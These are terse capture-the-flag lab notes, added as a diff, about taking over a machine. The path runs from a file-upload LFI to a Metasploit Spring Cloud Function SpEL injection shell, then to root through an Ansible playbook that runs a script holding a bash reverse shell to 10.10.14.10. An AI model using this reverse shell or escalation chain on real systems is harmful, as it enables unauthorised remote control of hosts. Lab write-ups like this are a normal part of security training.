@@ -1,0 +1,20 @@
+there was upload file .. when the file is uploaded there was lfi simple .. we found password for phil used and on looking in /vaw/www/webapp/springboot ==3.2.2==  2as there we could finf script
+
+but the msfconsole gave us a shell
+
+==multi/http/spring_cloud_function_spel_injection==
+
+now with the password we became phill now the ==anisble== exploit
+
+```
+└─$ cat playbook_1.yml                                        
+- hosts: localhost
+  tasks:
+    - name: RShell
+      command: sudo bash /tmp/root.sh
+      
+      
+ echo '/bin/bash -i >& /dev/tcp/10.10.14.10/5555 0>&1' > /tmp/root.sh
+```
+
+we get root
